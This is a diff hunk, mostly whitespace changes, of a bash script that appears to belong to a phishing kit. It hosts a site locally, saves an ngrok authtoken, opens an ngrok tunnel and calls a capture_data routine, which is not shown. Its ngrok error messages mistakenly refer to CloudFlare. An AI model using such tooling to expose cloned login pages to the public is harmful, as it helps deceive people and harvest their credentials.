@@ -598,74 +598,74 @@ start_loclx() {
 
 ## Start localhost
 start_localhost() {
-        cusport
-        echo -e "\n${BRIGHT_GREEN} Initializing... ${BRIGHT_GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
-        setup_site
-        { sleep 1; clear; banner_small; }
-        echo -e "\n${BRIGHT_GREEN} Successfully Hosted at: ${BRIGHT_GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
-        capture_data
+    cusport
+    echo -e "\n${BRIGHT_GREEN} Initializing... ${BRIGHT_GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+    setup_site
+    { sleep 1; clear; banner_small; }
+    echo -e "\n${BRIGHT_GREEN} Successfully Hosted at: ${BRIGHT_GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
+    capture_data
 }
 
 ## Start ngrok
 ngrok_auth() {
-        ./.server/ngrok authtoken -help > /dev/null 2>&1 &
-        sleep 1
+    ./.server/ngrok authtoken -help > /dev/null 2>&1 &
+    sleep 1
 
-        auth_f="$HOME/.ngrok2/ngrok.yml"
+    auth_f="$HOME/.ngrok2/ngrok.yml"
 
-        # Check if ngrok is configured (authtoken exists in config file)
-        if ! grep -q "authtoken:" "$auth_f"; then
-                echo -e "\n\n${GREEN} Create an account on ${ORANGE}ngrok.com${GREEN} & copy the authtoken\n"
-                sleep 3
-                read -p "${ORANGE} Input Ngrok Authtoken:${ORANGE} " ngrok_token
-                [[ $ngrok_token == "" ]] && {
-                        echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Ngrok Authtoken." ; sleep 2 ; tunnel_menu
-                } || {
-                        # Create .ngrok2 directory if it doesn't exist
-                        mkdir -p "$HOME/.ngrok2"
+    # Check if ngrok is configured (authtoken exists in config file)
+    if ! grep -q "authtoken:" "$auth_f"; then
+        echo -e "\n\n${GREEN} Create an account on ${ORANGE}ngrok.com${GREEN} & copy the authtoken\n"
+        sleep 3
+        read -p "${ORANGE} Input Ngrok Authtoken:${ORANGE} " ngrok_token
+        [[ $ngrok_token == "" ]] && {
+            echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Ngrok Authtoken." ; sleep 2 ; tunnel_menu
+        } || {
+            # Create .ngrok2 directory if it doesn't exist
+            mkdir -p "$HOME/.ngrok2"
 
-                        # Write the authtoken to the ngrok.yml file
-                        echo "authtoken: $ngrok_token" > "$auth_f" 2> /dev/null
-                        echo -e "\n${GREEN} Ngrok authtoken saved to ${ORANGE}$auth_f${GREEN}\n"
-                }
-        fi
+            # Write the authtoken to the ngrok.yml file
+            echo "authtoken: $ngrok_token" > "$auth_f" 2> /dev/null
+            echo -e "\n${GREEN} Ngrok authtoken saved to ${ORANGE}$auth_f${GREEN}\n"
+        }
+    fi
 }
 
 
 start_ngrok() {
-        cusport #Assuming this sets $HOST and $PORT
-        ngrok_auth # Ensure authtoken is configured
+    cusport #Assuming this sets $HOST and $PORT
+    ngrok_auth # Ensure authtoken is configured
 
-        echo -e "\n${ORANGE} Initializing Ngrok... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+    echo -e "\n${ORANGE} Initializing Ngrok... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 
-        echo -ne "\n\n${CYAN} Starting Ngrok tunnel..."
+    echo -ne "\n\n${CYAN} Starting Ngrok tunnel..."
 
-        if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok tcp $PORT &
-        else
-                sleep 2 && ./.server/ngrok tcp $PORT &
-        fi
-
-
-        sleep 5 #Give ngrok time to start
-
-        #Find the ngrok URL (you may need to adjust the grep if the output format changes)
-        ngrok_url=$(curl -s localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
+    if [[ `command -v termux-chroot` ]]; then
+    sleep 2 && termux-chroot ./.server/ngrok tcp $PORT &
+    else
+		sleep 2 && ./.server/ngrok tcp $PORT &
+    fi
 
 
-        if [[ -z "$ngrok_url" ]]; then
-                echo -e "\n${RED} Failed to retrieve Ngrok URL, check following possible reasons ${RED}"
-                echo -e "\n${GREEN} CloudFlare tunnel service might be down ${GREEN}"
-                echo -e "\n${GREEN} If you are using android, turn hotspot on ${GREEN}"
-                echo -e "\n${GREEN} CloudFlared is already running, run this command killall cloudflared ${GREEN}"
-                echo -e "\n${GREEN} Check your internet connection ${GREEN}"
-                echo -e "\n${GREEN} Try running: ./cloudflared tunnel --url 127.0.0.1:3333 to see specific errors ${GREEN}"
-                echo -e "\n${GREEN} On Windows, try running: cloudflared.exe tunnel --url 127.0.0.1 ${GREEN}"
+    sleep 5 #Give ngrok time to start
 
-        else
-                custom_url "$ngrok_url"
-                capture_data
-        fi
+    #Find the ngrok URL (you may need to adjust the grep if the output format changes)
+    ngrok_url=$(curl -s localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
+
+
+    if [[ -z "$ngrok_url" ]]; then
+    	echo -e "\n${RED} Failed to retrieve Ngrok URL, check following possible reasons ${RED}"
+        echo -e "\n${GREEN} CloudFlare tunnel service might be down ${GREEN}"
+        echo -e "\n${GREEN} If you are using android, turn hotspot on ${GREEN}"
+        echo -e "\n${GREEN} CloudFlared is already running, run this command killall cloudflared ${GREEN}"
+        echo -e "\n${GREEN} Check your internet connection ${GREEN}"
+        echo -e "\n${GREEN} Try running: ./cloudflared tunnel --url 127.0.0.1:3333 to see specific errors ${GREEN}"
+        echo -e "\n${GREEN} On Windows, try running: cloudflared.exe tunnel --url 127.0.0.1 ${GREEN}"
+
+    else
+        custom_url "$ngrok_url"
+        capture_data
+    fi
 
 }
 
